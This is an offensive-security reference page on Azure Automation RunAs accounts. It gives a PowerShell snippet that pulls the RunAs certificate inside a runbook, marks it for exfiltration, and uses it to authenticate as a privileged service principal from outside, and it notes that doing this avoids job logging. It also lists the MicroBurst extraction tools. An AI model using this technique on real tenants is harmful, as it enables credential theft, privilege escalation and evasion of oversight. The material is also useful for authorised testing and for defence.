---
title: "RunAs account: acting as the Automation service principal"
description: "Abusing the Automation RunAs account and its certificate to act as a privileged service principal."
keywords:
  - RunAs account
  - certificate
  - service principal
  - Automation
  - privilege escalation
---

# RunAs account

A legacy Automation **RunAs account** is a service principal with a certificate stored in the account, usually granted Contributor on the subscription. Exporting the certificate from inside a runbook lets you authenticate as that service principal from anywhere, outside the Automation sandbox and outside the account's logging.

## Exporting the RunAs certificate

```powershell
# inside a runbook, dump the RunAs connection certificate
$conn = Get-AutomationConnection -Name 'AzureRunAsConnection'
$cert = Get-AutomationCertificate -Name 'AzureRunAsCertificate'
# export the PFX bytes and exfiltrate; then authenticate from your host:
Connect-AzAccount -ServicePrincipal -Tenant $conn.TenantId `
  -ApplicationId $conn.ApplicationId -CertificateThumbprint $conn.CertificateThumbprint
```

## Exploitation notes

- RunAs accounts are deprecated in favor of managed identities but remain in many tenants; where present, the service principal is typically Contributor and its certificate is long-lived.
- Authenticating with the exported certificate happens off the Automation platform, so it avoids the runbook-job logging entirely.
- MicroBurst `Get-AzRunAsCertificate` automates the export.

## Tools

- **Az PowerShell** (`Get-AutomationCertificate`, `Connect-AzAccount -ServicePrincipal`).
- **MicroBurst** (`Get-AzRunAsCertificate`, `Get-AzPasswords`).

## References

- [NetSPI: MicroBurst (RunAs certificate extraction)](https://github.com/NetSPI/MicroBurst)
- [HackTricks Cloud: Azure Automation](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Microsoft: Automation RunAs accounts](https://learn.microsoft.com/azure/automation/automation-security-overview)
